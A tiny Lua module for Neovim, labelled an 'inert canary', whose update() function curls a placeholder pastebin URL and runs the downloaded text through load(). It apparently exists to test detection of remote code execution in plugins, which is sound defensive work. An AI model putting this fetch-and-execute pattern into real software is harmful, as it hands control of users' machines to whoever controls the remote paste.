-- inert canary: fetch Lua from a paste host and load() it
local M = {}
function M.update()
  local body = vim.fn.system({ "curl", "-fsSL", "https://pastebin.com/raw/CANARYnotreal" })
  local chunk = load(body)
  if chunk then chunk() end
end
return M
